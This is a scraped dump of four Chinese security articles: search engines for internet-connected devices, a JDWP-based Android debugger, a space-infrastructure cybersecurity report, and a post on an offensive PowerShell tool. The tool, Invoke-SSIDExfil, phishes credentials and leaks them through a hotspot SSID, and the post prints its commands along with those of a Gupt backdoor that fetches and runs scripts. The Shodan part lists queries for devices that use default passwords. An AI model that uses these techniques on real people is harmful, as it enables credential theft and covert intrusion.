您会惊讶地列出了多少设备。 （希望你的不在那里，如果是，我建议更改你的密码。）如果你觉得上面的搜索语法，还不够表现出 Shodan 的强大 。那么，接下来我将向你介绍另一个 Shodan 上最受欢迎的搜索关键字“default password”，绝对会让你大吃一惊！此搜索字词，可以为你在 banner 信息中筛查出具有“默认密码”的结果 。并且你会发现，有不少的设备都存在默认密码的安全问题！你大可以利用 Shodan 来检测下你自己设备的安全性，如果也存在默认密码的问题，建议你尽快更改你的密码！其实 Shodan 真正有价值的地方在于，它能为你找到更具体的目标。例如：你想搜索所有正运行在 22 端口上的 SSH 服务，那么你的搜索语法可以这么写“SSH port:’22’”。在返回结果中，你还可以查看到设备正在使用的 IP 地址，位置，服务主机，ISP 和 端口等信息 。通常，Shodan 还将揭示设备的指纹，密钥交换（kex）算法，服务器主机密钥算法，加密算法，MAC 算法和 压缩算法（如果它们存在话）。如果无意中你的一个个人设备被显示在了 Shodan 搜索结果中，并公开了你一些不想被公开的信息 。那么，这将会是你弥补漏洞的好机会！对于渗透测试者来说，任何数据都有可被利用的价值 。当然 Shodan 并非黑客的专属，即使你不是一名黑客，探索 Shodan 也同样非常有趣 。有人最近分享的一个奇怪的搜索字 “port：’6666”kiler”，它能为我们找到感染了 KilerRat 木马 的设备 。Credit: 2015 AlienVault 1KilerRat 是一个远控木马，它可以偷取登录凭证，修改注册表信息，打开反弹 shell，从而使攻击者能够直接通过命令操控系统 。它甚至还可以远程开启受害者的网络摄像头 。 看来，我要拿胶带封堵住我的摄像头了…PunkSPIDER相比起 Shodan 这样庞大的搜索引擎， PunkSPIDER 则显得小巧许多 。但它却有着，类似于 Shodan 的一些功能 。PunkSPIDER 是一个全球性的 Web 应用程序漏洞 搜索引擎 。其背后是一个强大的扫描器 PunkSCAN，它可以一次执行大量的安全扫描。PunkSPIDER 可以搜索的攻击类型包括：跨站脚本（XSS），SQL盲注（BSQLI），操作系统命令注入（OSCI）和 路径穿越（TRAV）。即使你不熟悉这些常见的攻击类型，你依然可以使用 PunkSPIDER，你可以单纯的把它当成一种乐趣，或者用它来检测你网站的安全性 。在实验中，我对一个特定的 URL 进行了扫描， 但返回的结果非常少。（这可能是因为我选择的目标网站，安全度较高的缘故。）这里有一个例子：搜索 “Deepdotweb.com”。结果如下：www.deepdotweb.comScanned: 2015-08-11T20:12:57.054ZBsqli:0 | sqli:0 | xss:0 | trav:0 | mxi:0 | osci:0 | xpathi:0 | Overall risk:0第一行显示的是我们扫描的 域。第二行显示的是，将域添加到 PunkSPIDER 系统的日期和时间 。第三行显示各种攻击类型的列表，以及是否找到该攻击类型的漏洞 。从结果中我们可以看到，在对 Deepdotweb 的扫描结果中，所有的数值均返回为“0”。这说明我们的网站，目前是相对安全的 。相反，如果你使用诸如“博客”，“社交媒体”，“论坛”或“色情”这样的词语来进行更广义的搜索，那么你可能会搜出数百个结果，特别是当你使用“色情”这个关键字时 。提示：URL 被显示在搜索结果中，并不一定意味着该站点已被感染 。有关如何使用 PunkSPIDER 的更详细说明，请参阅 PunkSPIDER 搜索帮助文档 。这里顺便提一句，出于好奇这里我使用了 “.onion” 作为关键字来进行搜索，结果得到了 588 条的返回结果。这说明在某种程度上 PunkSPIDER 可以扫描到一些 Tor 的隐藏服务。IVRE这里有一个比喻：Shodan 是表网上的 Tor，而 IVRE 则更像 I2P 匿名网络 。换句话说，虽然 Shodan 是一个非常强大的搜索引擎，并且具有先进的功能，但它对新手来说却非常友好。Tor 也是如此：即便你不是一个 IT 专家，你也可以非常轻松地使用它；同时，它也为那些高级用户，提供了更多的选择 。I2P 匿名网络项目的设计，更倾向于网络安全专家；甚至其主控台的操作都需要具备基本的网络知识 。同样，IVRE 相比 Shodan 或 PunkSPIDER ，似乎更像是专为黑客，程序员或渗透测试者而设计的 。说了这么多，那么  IVRE 到底是什么呢？ IVRE 其实是一个用 Python 编写的开源的 网络侦察框架 。它使用诸如：Bro，Argus，NFDUMP 和 ZMap 之类的工具，来返回有关互联网连接设备的数据 。它还可以从 Nmap 和 Masscan 导入 XML 输出。 更多具体的内容就不在这里过多介绍了！对于 IVRE 显示的 Nmap 主动扫描的结果，如果你觉得查找不方便，你可以使用关键字（这有点类似于 Shodan）来进行过滤查找指定的结果 。例如你可以使用以下关键字，“phpmyadmin”，“anonftp” 或 “x11open” 等。搜索 “phpmyadmin” 将返回 phpMyAdmin 服务器的结果；“anonftp” 查找允许匿名访问的 FTP 服务器；“x11open” 查找开启的 X11 服务器。当然，还有很多实用的关键字，需要大家自己去探索和发现！例如，以下是搜索关键字“phpmyadmin”和“sortby：endtime”的显示结果：显然，这只是  IVRE 最基本的一些用法 。如果你想了解更多关于 IVRE 的使用方法，你可以去查阅他们在 GitHub 上维护的  doc/ 参考文档 。你还可以浏览他们的 官方博客 来了解更多关于 IVRE 的内容 。ZoomEyeZoomEye（钟馗之眼）是由国内知名安全公司 Knownsec 开发的。最早版本发布于 2013 年，当前最新版本为 ZoomEye 3.0 版。就像前面介绍的搜索引擎一样，如果你知道特定的搜索字符串，ZoomEye 就可以帮你找到你想找的内容 。下面是一些常用的搜索字词：Apache httpd – 查找 Apache 服务器。device:”webcam” – 查找互联网连接的网络摄像头。app:”TED 5000 power use monitor” – 查找 TED 监视器设备。除了以上我所举例的搜索关键字外，还有上千种其它搜索关键字可以尝试。 ZoomEye 像 Shodan 一样，也可以按国家，公共设备，网络服务等进行过滤搜索 。如果你实在不知道该搜索什么， ZoomEye 在页面上也为我们提供了一些比较热门的搜索关键字，你都可以尝试使用下！Censys最后让我们来看看 Censys，就像上面介绍的几个搜索引擎一样，它同样被用来搜索那些连接互联网的设备 。在扫描 IPV4 地址空间时，它使用 ZMap 和 ZGrab（通过 ZMap 操作的应用层扫描程序）来收集数据  。以下是几个搜索示例：https://www.censys.io/ipv4?q=80.http.get.status_code%3A%20200 – 搜索所有具有特定 HTTP 状态代码的主机 。你也可以通过输入 IP 地址来查找，例如：“66.24.206.155” 或 “71.20.34.200”（这些只是示例，并非真实的主机）如果想要查找在 23.0.0.0/8 或 8.8.8.0/24 网段的主机，则只需要输入 “23.0.0.0/8 or 8.8.8.0/24” 来进行查找 。此外，Censys 还可以执行全文搜索 。例如你搜索 “Intel” 这个关键字，那么它会在记录中找到所有带有 “Intel” 字样的主机；与大多数标准搜索引擎一样，你也可以使用布尔运算符，例如 “and，”“or，” 和 “not” 来进行查找 。总结：想要更好的利用这些搜索引擎，还需要我们多加练习和掌握基本的语法规则 。但同时也要学会探索和尝试构造一些，你独有的关键字词去进行搜索，这可能会带给你意外的惊喜！除此之外，你应该学会灵活的使用它们。就像你使用普通的搜索引擎一样，不同的搜索引擎，可能会得到许多不同的查询结果。","2016-12-22 12:14:55","安全工具","五大安全研究者必用的搜索引擎","http://nsoad.com/Security-tools/20161222/tools-925.html"
"5ccbfa264f2f0a0a7a69c021","本文主要讲解Android虚拟机动态调试背后涉及到的技术原理，除了JDWP协议细节，还包括任意位置断点、堆栈输出、变量值获取等基础调试功能的具体实现。另外本文提供了一款新的android动态调试工具——AVMDBG","silence","* 本文原创作者：渔村安全，本文属FreeBuf原创奖励计划，未经许可禁止转载 本文主要讲解Android虚拟机动态调试背后涉及到的技术原理，除了JDWP协议细节，还包括任意位置断点、堆栈输出、变量值获取等基础调试功能的具体实现。另外本文提供了一款新的android动态调试工具——AVMDBG，提供调试API接口，支持python脚本扩展。作为android调试技术研究过程中的实验项目，AVMDBG功能尚不完善，开源出来仅供参考，如过有bug或其他疑问反馈欢迎提交issue。一、Android动态调试方案在讲解android动态调试实现之前，先回顾下针对apk进行动态调试常用的几种方法，比较下不同解决方案的特点和存在的问题：1）smali插桩大法，反编译apk后在关键位置插入smali代码，通过打印日志的形式进行调试跟踪。但是这个方法非常繁琐，除了需要编写smali代码外，每次新增日志输出点都需要重新解包重打包，而且经常会遇到apk保护导致解包失败的问题需要解决。2）IDA在6.6版本以后支持dex文件的动态调试，但是部分功能并不完善，比如监视寄存器变量的值，需要通过watch窗口手动添加并指定类型，而且单步过程中需要留意类型变化，可能导致虚拟机意外崩溃，导致这个问题的原因在后续文章中会分析到。3）JEB，堪称apk静态分析的神器，在2.0版本以后开始加入动态调试的功能，最新版本同时支持smali代码和native代码的调试，功能可以说非常强大，如果说缺点可能只有一个，和IDA一样都是商业软件，收费不菲。4）andbug开源项目，5年前的项目原作者已经不再维护，原项目只支持linux环境，动态调试关键功能也有缺失，例如不支持任意代码位置断点等。使用过程中也碰到过一些bug，类似shell的交互方式使用起来并不是很顺手。后来有国内开发者anbc对该项目进行了完善改造，新增函数调用监控功能支持配置文件。5）android studio+smalidea插件，也是一个非常不错的调试解决方案，作者通过IDE调试器插件的形式支持smali代码的动态调试，使用过程中偶尔会遇到跳行的bug。smalidea插件同样是开源项目，作者的作品还有非常知名的dex反汇编工具baksmali等。6）xposed类的安卓代码Hook框架，可以通过在函数入口和出口处hook进行调试输出，但同样无法对函数内部代码进行断点输出。类似的项目还有cydia_substrate、frida、ddi等，也都是非常优秀的开源项目。二、JDWP协议简述JDWP是JavaDebug Wire Protocol (Java调试线协议)的缩写，简单来讲，就是调试器和目标虚拟机进行调试交互的通信协议，调试器通过JDWP协议来获取JAVA虚拟机中程序的信息或控制目标程序运行状态，比如函数断点设置，线程状态、变量值获取等，而目标虚拟机也在指定事件触发时通过JDWP协议通知调试器进行处理，比如断点事件消息、线程创建消息等。[1] JDWP协议交互简图Android虚拟机虽然和普通java虚拟机存在不少差异，但是它的调试接口同样是基于JDWP协议的，Dalvik虚拟机JDWP服务端的实现源码位于：./android/dalvik/vm/jdwp。androidstudio、eclipse 等IDE的调试功能和DDMS的监控功能也都是基于JDWP协议实现的。JDWP协议通信要求首先进行握手会话来表明互相的身份，调试器端发送的与虚拟机返回的数据包内容一样，内容为“JDWP-Handshake”，通过验证以后才可以继续后续的会话。[2] JDWP协议通信前需要进行握手会话Android虚拟机的JDWP实现支持adb和socket两种通信方式，可以使用adb的jdwp命令进行端口转发绑定，这样就可以通过socket和调试目标进程进行通讯，命令格式为”adb forwardtcp:[port] jdwp:[pid]”。JDWP协议的通信会话主要包含2类数据包，分别为Command packet(命令包)与Reply packet(回复包)：1）Command packet：调试器发送给虚拟机用于获取程序状态信息或控制程序运行；虚拟机发送给调试器用于通知事件触发消息。2）Reply packet：虚拟机发送给调试器用于回复命令包的请求或者执行结果。JDWP数据包主要包含包头和和数据两部分，包头部分格式长度固定，为11字节，数据部分为可变长度，字段结构由其包头指定的类型决定。下面详解包头各字段的含义：[3] JDWP数据包头结构简图从上图可以看出，命令包和回复包的包头结构基本一致，区别在于最后2个字节，命令包拆分为2个单字节分别表示命令分组和命令序号，在回复包中则用于表示错误码，非0表示命令执行存在错误。以java7为例说明，JDWP协议按功能划分为18组命令，总计91个不同命令请求，包含了虚拟机、引用类型、对象、线程、方法、堆栈、事件等不同类型的操作命令。JDWP协议支持的命令细节可以参考官方文档，这里不再赘述。Android虚拟机对JDWP协议的支持实现并不完整，当然调试需要的绝大部分关键命令都是支持的，具体信息可以参考安卓dalvik虚拟机源码：./android/dalvik/vm/jdwp/JdwpHandler.cpp  ，下图是dalvik虚拟机(以android4.2版本为准)支持的命令请求类型表：[4] JDWP协议命令表简图(以android4.2版本支持为准)虽然上面图表中的命令类型比较多，但JDWP协议本身并不算复杂，按协议标准进行组包请求即可，下面以获取目标虚拟机版本信息的命令“VirtualMachine：version”为例，演示一次JDWP协议的交互通信过程：[5] “VirtualMachine：version”命令返回数据的注解从上图的命令注解中可以看出，“VirtualMachine：version”请求命令没有附加数据，回复包数据中包含5个字段，通信数据包解析过程如下图：[6]“VirtualMachine：version”命令通信数据包解析从上图的解析示意中，我们最终获取到目标虚拟机的版本信息，这中间有2点需要注意：1）数据包中数据使用大端模式；2）基本数据类型的内存结构，例如string，使用[长度]+[字符数据]的形式；下面我们整理下JDWP协议中使用到的其他基本数据类型，在后续的命令请求与数据包解析中都会频繁使用到。其中有些数据类型的长度是由虚拟机实现定义的，比如ObjectID等，可以通过“VirtualMachine：IDSizes”命令进行获取。下图整理的数据类型说明以Android虚拟机的实现为标准：[7] JDWP协议使用到基本数据类型三、动态调试的核心 —— 任意代码位置断点针对简单apk进行逆向时静态分析就足够胜任，但是碰到下面几种情况的时候，“任意代码位置断点”的动态调试分析则更加合适：1）需要对代码中的关键参数、变量值进行观察，例如加密后的字符串。2）对偏底层的公共函数库进行hook输出，快速筛选定位可疑调用，例如API调用监控等。3）在代码规模比较庞大、调用逻辑比较复杂的情况下，需要使用堆栈跟踪对可疑关键点的调用路径梳理确认。“任意代码位置断点”功能不单指代码断点的调试事件通知，还会涉及到虚拟机栈结构、寄存器使用、参数变量值获取以及堆栈跟踪等方面的功能，但是其中很多知识点限于篇幅无法在本文中全部讲解透彻，这里推荐两篇关于Dalvik虚拟机的文章可以作为扩展阅读：《深入理解Android之Java虚拟机Dalvik》、《Dalvik虚拟机进程和线程的创建过程分析》。下面重点讲解断点功能的实现，其中的关键点可以归结为以下几个问题：1） 如何设置和处理断点事件？断点设置需要用到的命令是“EventRequest：Set”，该命令支持多种事件请求，包括断点、单步、类加载、方法进出、字段访问、线程、异常等多种事件，设置成功以后目标虚拟机会返回RequestID，并且在事件触发时会发送相应的事件信息给调试器请求处理(Event：Composite)，各类事件命令的具体格式可以参考官方文档。下面以断点为例进行讲解事件设置，首先看下事件命令请求的结构字段：[8] 断点命令请求的数据包字段结构 上面的断点事件我们只设置了一个过滤器，就是断点位置Location，这个结构体用于指明触发事件的代码位置，包含类型标记，ClassID，MethodID以及代码偏移DexPc。1.其中的ClassID和MethodID两个字段的值可以通过“VirtualMachine： ClassesBySignature”命令与“ReferenceType： MethodsWithGeneric”命令获取。[9] 获取ClassID与MethodId的演示代码2.代码偏移位置DexPc值可以使用反汇编工具baksmali的“-l”参数获取。下图红圈中的数字就是代码偏移位置。[10] backsmali反汇编结果中的代码偏移标记当虚拟机运行到我们设置的断点位置以后，会发送“Event： Composite”命令给调试器，目标虚拟机发送的命令中会包含线事件类型、请求序号、线程序号以及代码位置等信息，其中请求序号和断点命令返回的请求序号是对应的，调试器可以根据请求序号进行相应后续处理，例如获取线程堆栈、变量值等，最后需要恢复虚拟机的运行状态。断点事件报告的字段结构如下图： [11] 断点事件报告的数据包字段结构2） 如果获取当前函数调用栈信息通过获取当前线程的调用栈信息可以定位目标函数的调用路径和源头，对于逻辑层次复杂的逆向分析非常有用。对应的JDWP命令为“ThreadReference：Frames”，该命令的请求包与返回包字段比较简单，结构如下：[12] “ThreadReference：Frames”命令相关包的字段结构返回数据为栈帧数组，每一层栈帧信息包含栈帧ID和栈帧位置2个字段，第一层栈帧一般为当前函数，其栈帧ID在后面堆栈获取变量值命令中需要使用。栈帧信息解析后输出的例子如下：[13] “ThreadReference：Frames”返回数据的解析结果3） 如何获取函数参数值与变量值dalvik虚拟机和普通java虚拟机最大的区别之一应该是dalvik是基于寄存器架构的，可以观察dex反汇编后的smali代码内容，参数传递、变量赋值全部都是对寄存器的操作。关于smali语法与寄存器变量等方面的基础知识，推荐几篇文章作为前置阅读：《smali-Registers》、《smali-TypesMethodsAndFields》、《Smali学习笔记》，本文就不再赘述。从当前堆栈中获取寄存器值需要使用“StackFrame：GetValues”命令，下面我们解析下该命令的请求包、返回包的字段结构： [14] “StackFrame： GetValues”命令的注解该命令请求中的有几个关键字段需要详细解释：1)ThreadId，返回包中触发断点事件被挂起的线程ID。2)FrameId，可以通过“ThreadReference： Frames”命令获取，从返回的栈列表中取第一层栈帧，即可获得的我们需要的当前栈帧ID。3)Slot，变量偏移位置，这个字段是“StackFrame： GetValues”命中最为关键的字段，对于Debug版的apk可以通过“Method： VariableTable”命令获取，但是逆向分析遇到的几乎都是Release版本，是不包含这些调试辅助信息的，关于参数和变量对应偏移位置slot的计算方法，我们可以尝试从dalvik虚拟机源码中寻找答案。dalvik虚拟机处理“StackFrame： GetValues”命令的函数为handleSF_GetValues，handleSF_GetValues函数主要负责解析请求包的字段信息，扩展返回数据的内存空间，最后调用dvmDbgGetLocalValue获取变量值。下面我们跟踪slot参数的传递使用过程来分析它的含义。[15] dvmDbgGetLocalValue函数的代码解析从上图的dvmDbgGetLocalValue函数代码解析过程中，我们有以下几点发现：1) frameId值就是当前栈指针的内存地址，函数调用过程中使用的寄存器(参数与局部变量)相当于此处的内存映射，而slot值就相当于映射偏移索引号。参数使用最后的N个寄存器(内存段高地址)，局部变量使用从v0开始的前(M-N)个寄存器(注意参数占用2个寄存器的情况)。2) Slot偏移值会经过untweakSlot函数处理，这可能是针对Eclipse的变通方案。1000偏移被重定向到0，而0偏移被重定向到参数偏移起始处，在计算slot索引值时需要注意到这一点。3) 获取变量值支持的几种类型细节如下：boolean、byte、short、char、int、float类型的变量直接根据slot偏移取值，大小为4字节,占用1个寄存器；array、object类型根据slot偏移取值为Object指针,查表获得ObjectId返回，大小为4字节，占用1个寄存器；double、long类型根据slot偏移取值，大小为8字节，占用2个寄存器。4) IDA的watch窗口指定变量类型取值后可能导致崩溃的原因在这里也可以找到，在进入其他函数调用过程时，没有及时手动修正watch窗口指定的寄存器类型，取值过程由于读取异常抛出导致虚拟机退出。以下为2个函数的参数与局部变量slot偏移结果的对比，其中一个是普通成员函数，另外一个为静态成员函数，可以通过这两个例子加深对slot计算的理解：[16] 普通成员函数参数与变量slot解析[17] 静态成员函数参数与变量slot解析四、全新的android动态调试工具——AVMDBGAVMDBG是android虚拟机调试技术研究过程中一个实验项目，目前只支持dalvik虚拟机，已实现代码断点、堆栈输出、参数变量值获取等基础功能。项目地址：https://github.com/cheetahsec/avmdbg项目说明：AVMDBG的目标是打造一款轻量级的的android虚拟机调试器，底层使用C++编写，通过Python扩展的方式提供调试接口，可以通过编写python脚本实现对安卓app的快速动态调试，当前版本主要提供以下API：1.bool attach(string&amp;processName);功能: 附加到目标进程2.void waitLoop();功能: 循环等待调试事件3.bool setBreakPoint(py::dict&amp;breakPoint);功能: 设置断点事件4.py::list getStackFrames(ObjectIdthreadId);功能: 获取当前线程堆栈，可在断点回调函数中使用5.py::dictgetRegisterValue(py::dict&amp; Context, string&amp; regName, u1varType);功能: 获取寄存器变量的值，需要指定寄存器名称(V命名或P命名法)以及变量类型6.py::listgetObjectFieldValues(ObjectId objectId);功能: 获取对象的成员变量信息，参数为对象ID7.py::dict getArrayObjectValue(ObjectIdobjectId);功能: 获取数组类型变量的信息8.py::str getStringValue(ObjectIdobjectId);功能:获取字符串String类型变量的值详细的使用说明可以参考项目文档和测试demo，以下为部分测试代码展示：[18] AVMDBG功能测试代码[19] AVMDBG测试输出结果五、参考文档1)《深入Java调试体系》2)《Java(tm) Debug WireProtocol》3)《深入理解Android之Java虚拟机Dalvik》4)《Dalvik虚拟机进程和线程的创建过程分析》5)《smali-Registers》、《smali-TypesMethodsAndFields》6)《Android dalvik虚拟机源代码》* 本文原创作者：渔村安全，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-09-23 17:47:02","移动安全","Android虚拟机调试器原理与实现","http://nsoad.com/Article/MobileSecurity/20160923/437.html"
"5ccbfa264f2f0a0a7a69c022","2016-10-03_142243.png","Kong","科幻剧《星际迷航》有一集名为“最后前沿（The Final Frontier）”，意指探索浩瀚宇宙为人类科学最后的前沿。            1 概要通常，人们在讨论国家关键基础设施的网络威胁时，往往忽视了卫星和其它太空设备存在的漏洞攻击。这是一个重大失误，因为卫星技术是社会不断发展的本质，如导航、通信、遥感、监测等其它无数关键应用。太空和其相关领域存在的网络安全隐患将会成为国家、地区或国际问题，而要了解认知这种非传统安全威胁，就必须对网络和太空安全的交叉问题进行研究。美国近年把太空环境形容为空间日益拥堵（Congested）、争夺日益加剧（Contested）、竞赛日益激烈（competed）的3C时代，并积极制订了相关的太空安全战略确保其太空领导权；俄罗斯国防策略也强调，亟需对当前和未来的信息领域战争制订国际合作规则。本报告目的在于，指出太空空间供应链存在的网络安全管理问题，并给出相关建议，希望缓解太空基础设施中存在的安全漏洞隐患。2 背景查塔姆国际安全研究所（ Chatham House ）长期对网络和太空安全的交叉领域进行专业研究。2015年，与日本笹川和平基金会合作，对导致军用卫星瘫痪的相关网络攻击技术进行了研究，在《卫星安全-导致网络攻击的漏洞》研究项目中指出：网络攻击可摧毁或瘫痪卫星和其它太空设备；潜在的解决方案是加强国际合作、制订政策或增加技术研究投入；另外，查塔姆国际安全研究所还多次召集各方专家对太空领域设备存在的安全漏洞进行讨论，以寻求和促进相关政策和解决方案的达成。3 挑战在复杂多样的网络威胁背景下，全球政府和金融机构正在以互联网为主要经济模式的环境下，寻求安全防范与商业发展之间的一致平衡。由于国家间太空战略竞争，太空空间正成为刺激经济和技术发展的关键角色，因此，卫星服务很可能成为一系列网络攻击的潜在目标。太空领域的关键节点攻击，可能对国家或国际关键基础设施和能力造成影响。查塔姆最新报告指出，网络和太空安全领域的“进攻”和“防守”界线变得越来越模糊，但相比之下，“进攻”比“防守”发起成本更低、更简单。    当各国政府极力重视网络安全的同时，本文认为，与太空相关的复杂供应链和基础设施一样存在被网络攻击的安全隐患。4 当前现状和反应目前，全球范围内还没有相关的太空网络安全研究机构。应对这种挑战，需要激进和创新的观点。卫星通信和导航系统的经验告诉我们，尽管太空网络安全市场还需定义成形，但总体前景估计良好，太空网络安全面临的国际挑战可能是未来保护空间资产设备的一个战略机遇。太空空间任务和相关支持功能需要系统定义，同时危机缓解策略的研究也必不可少。当前，亟需一些在太空空间有能力的国家和关键机构组成国际意愿团体，制订灵活的国际空间发展机制和网络安全制度，这种机制和制度将会提供快速、及时的反应能力，同时也能实现协调和监督作用，有利于太空空间合理发展。为了应对太空网络安全威胁，几个国家机构已经开始建立合作机制，如CERT组织下的CERT-UK、CERT-JP、JP-CERTCC、CERT-IN、CERT-GH、US-CERT等。5 太空网络安全威胁威胁识别：太空相关系统（天基系统）网络威胁分类如下：国家间的军事战略利益，或以窃取战略性知识产权为目的的通信破解；以经济利益为目的，掌握大量资源的犯罪组织攻击；恐怖组织的为达宣传效应的攻击，或是操作卫星相撞等极端行为；个人黑客炫耀技术的攻击。威胁方法：对通信网络和空间基础设施的干扰、欺骗和黑客攻击；针对卫星控制系统和任务包的攻击，达到控制卫星功能，如关闭、变轨、或把太阳能电池暴露于电离辐射环境等；对地面基础设施的攻击，如卫星控制中心、相关的网络和数据中心，导致潜在的全球性影响（如天气预报系统等）。    2011年，美国国会报告指出，2007年至2008年间，至少有两颗美国环境监测卫星受到四次或更多干扰，NASA的陆地7号监测卫星Landsat-7受到多达12分钟的干扰，NASA的另一颗地球监测卫星Terra AM-1曾在不同天内分别受到2分多钟和9分多钟的信号干扰。美国国家海洋和大气管理局曾于2014年9月遭受黑客攻击，导致卫星数据系统被迫下线，造成天气预报机构48小时的数据缺失。    威胁产生原因：威胁途径非常复杂，但主要可以总结如下：越来越多的卫星和星群提供了越来越多的入口点；通信链路连通性和轨道连通性的增加；自主通信链路的增加；卫星供应商的质量标准不确定性卫星组件；太空设备设计商只关注市场需要的重要安全控制；更小更便宜的卫星在安全成本方面，与制造成本不成比例；加密和其他安全控制系统的后门漏洞。网络攻击对太空基础设施造成的后果有哪些？包括但不限于：降低国家安全或国防防御能力；降低通信、观测能力或导航精度；破坏包括精确计时系统在内的其它通信设施，导致通信缺乏保密和认证措施；变换轨道运行参数导致碰撞；破坏或劫持太空车；破坏完整的发射器和有效载荷装备，在发射阶段造成更大风险；破坏或删除卫星传输数据；截取包括敏感信息在内的通信内容；重设路由的通信拦截；信号干扰或数据欺骗。 6 卫星网络威胁干扰一种试图通过降低和破坏信号，扰乱通信传输和接收的攻击。干扰装置通常以相同或更高的频率传输电磁能量，模拟发送信号，干扰接收机。所有的无线通信系统都容易受到电磁干扰或人为干扰。卫星上的接收装置也能被干扰而无法接收上行链路信号。地面干扰：影响位于特定地理区域的接收机的操作能力。一个已被应用多年的技术，例如，专制政府试图阻止人们访问未经授权的无线电或电视广播，在动荡和政治控制时期，政府为维持和控制国内信息与传播，可以针对广播电视进行电磁地面干扰。地面干扰也可用来短期内阻止移动电话网络和互联网访问，有时被称为“无线拒绝服务攻击”。轨道干扰：干扰由地面站向卫星传输的信号。干扰器不一定要在信号发射器附近，可以位于接收卫星波束的任何地方。轨道干扰活动的地理范围不受干扰器的物理位置影响。网络攻击近年来，通信和导航系统攻击已经成为一系列新型复杂网络攻击，这些攻击背后的漏洞非常受到关注，一方面由于它们难于检测发现，另外能导致拒绝服务、完整性认证失败等不安全的严重后果。SpoofingSpoof欺骗原理其实就是伪装成一颗伪卫星进行播发定位数据，从而欺骗接收机。欺骗攻击通过操纵信息交换通信，从而降低其完整性。一个成功的欺骗攻击可能被用来针对和直接破坏关键基础设施，如对国家电网或金融业务的高频交易系统引入错误的定时信号，造成间接经济损失。国际性事件影响和安全意识1997年，美国关键基础设施保障研究会有先见之明地在报告中指出“与现代化相关的国家空天系统漏洞将会是最严重的安全隐患”。目前，随着全球导航系统的发展，各国都具备了一定的卫星导航能力，如美国的US-GPS，俄罗斯的GLONASS，欧洲的SBAS以及GalileoGNSS，中国的北斗BDS，印度的NAVIC、IRNSS，以及日本正在研发的QZSS。而空天故障也会发生，2016年1月26日，第二代GPS卫星“SVN 23”正式退役，在从GPS星座移除过程中，触发了GPS地面软件问题，导致GPS时间出现13.7微秒误差；当然，在关键基础设施的保护方面，并不是所有国家都能像美国一样有先见的意识和充足的资源。太空军事战略设备漏洞军事战略和战术导弹系统高度依赖于卫星和空间基础设施，它们用于导航、瞄准、指挥控制、作战监控等功能。然而，由于对天基设备、地面站和相关指挥和控制系统安全性缺乏足够重视，针对卫星的网络攻击会严重破坏战略武器系统的完整性。劫持、摧毁或关闭卫星尽管网络攻击很难从物理上控制卫星，但并不是无法攻破，这会极大地吸引那些试图控制ICS或SCADA系统的攻击者。对卫星的网络攻击包括针对地面站的攻击，而卫星内置计算机的远程定期更新，以及大量卫星硬件可能出现的后门都会带来安全隐患和漏洞。即使没有硬件“后门”，但对于复杂的网络攻击来说，目前的加密方法也可能无法阻止。通过地面站的攻击可以控制、摧毁或关闭卫星，而被控制可变轨的卫星就像一种太空武器，对空天设备和地面国家将会形成巨大的安全威胁。商业卫星漏洞2014年，安全公司IOActive对通信卫星的漏洞进行了安全评估。评估包括卫星通信相关的海上作业、个人通信、SCADA、语音、数据、航空和军事系统等 ，之后，IOActive发现许多卫星系统设备和软件缺乏根本的安全防范和定期更新措施，导致漏洞长期存在。7 促进国际合作和相关措施实施制订太空网络安全响应准则政策要求政府治理管理开放包容政权强制行为具备灵活性和主动性风险管理降低供应链安全风险8 建议提高安全意识提高防范意识识别依赖关系识别漏洞建立弹性的应急响应机制开发面向未来的软硬件设施严格的采购策略严格的监管要求经验分享建立良好的风险管理和实践机制四篇卫星黑客技术文章：slideshare1，slideshare2，    dailywireless，inforsecinstitute","2016-10-06 15:41:13","网络安全","太空基础设施安全：网络安全最前沿","http://nsoad.com/Article/Network-security/20161006/494.html"
"5ccbfa264f2f0a0a7a69c023","在研究的过程中，我脑海里突然冒出了一个非常有实用性的想法：用无线热点的SSID来进行数据提取。因为SSID最多只支持32字节的数据，所以我们并没有多少可以提取的数据。不过，我们的确可以从如此有限的数据","kong","这几天，我一直都在研究Windows的无线热点（承载网络）功能。在研究的过程中，我脑海里突然冒出了一个非常有实用性的想法：用无线热点的SSID来进行数据提取。因为SSID最多只支持32字节的数据，所以我们并没有多少可以提取的数据。不过，我们的确可以从如此有限的数据中提取出像用户凭证这样的信息。脚本介绍为此我编写了一个PowerShell脚本，在这个脚本的帮助下，我们仅仅通过无线网络的SSID就可以提取出目标数据了。这个脚本(Invoke-SSIDExfil.ps1)提供了多种数据提取选项，我们可以根据自己的需求来进行设置。因为我们现在的主要目标就是提取出用户的凭证数据，因此我们的脚本使用了Invoke-CredentialsPhish脚本的实现逻辑来提示用户输入凭证信息，并捕获到凭证的明文数据。接下来，脚本会使用ROT13（我并不打算称其为ROT13加密算法，因为这并不是正确的技术术语）来对捕获到的凭证数据进行编码，然后创建一个Windows无线热点。最后，我们要将计算得出的编码值以“Domain:用户名:密码”这样的格式设置为热点的SSID。脚本下载下载地址：Invoke-SSIDExfil.ps1脚本运行接下来，我给大家演示一下该脚本的运行过程。请注意，一定要以管理员权限启动PowerShell之后再运行这个脚本，因为该脚本需要高级权限才可以正常运行。在命令行界面中输入下列命令：PS C:\&gt; Invoke-SSIDExfil –Verbose如果我们离目标距离比较近的话，我们将可以看到如下图所示的界面：现在，我们就可以使用Invoke-SSIDExfil.ps1脚本的解码选项来解码用户的凭证数据了，整个过程也非常的简单。我想要提醒大家的是，在针对客户端的攻击、命令执行、人机接口渗透工具Kautilya、以及其他的攻击技术中，我们都可以使用这个脚本来作为攻击的Payload。除此之外，“-StringToExfiltrate”和“-ExfilOnly”这两个参数还可以在不提示用户输入凭证的情况下提取出一小部分有效数据。更新Gupt后门（Gupt-Backdoor）在编写这个脚本的时候，我重新回顾了一下Gupt后门的实现机制【传送门】，并更新了其中的一些功能。我添加了该后门对PowerShellv3的支持，并且使用ROT13对SSID进行编码。下面这行命令可以在目标主机中开启后门，并声明你所提供的命令将是经过编码处理的命令：PS C:\&gt; Gupt-Backdoor -MagicString op3n -EncodedCmd –Verbose那么一个无线网络热点到底是如何向后门发送控制命令的呢？请看下图：执行过程和最终结果如下图所示，该后门从Nishang框架中下载并执行了脚本Get-WLAN-Keys.ps1。虽然升级幅度不大，但实用性非常高。","2016-11-29 12:54:39","安全工具","如何使用WLAN的SSID提取用户的凭证数据","http://nsoad.com/Security-tools/20161129/tools-863.html"
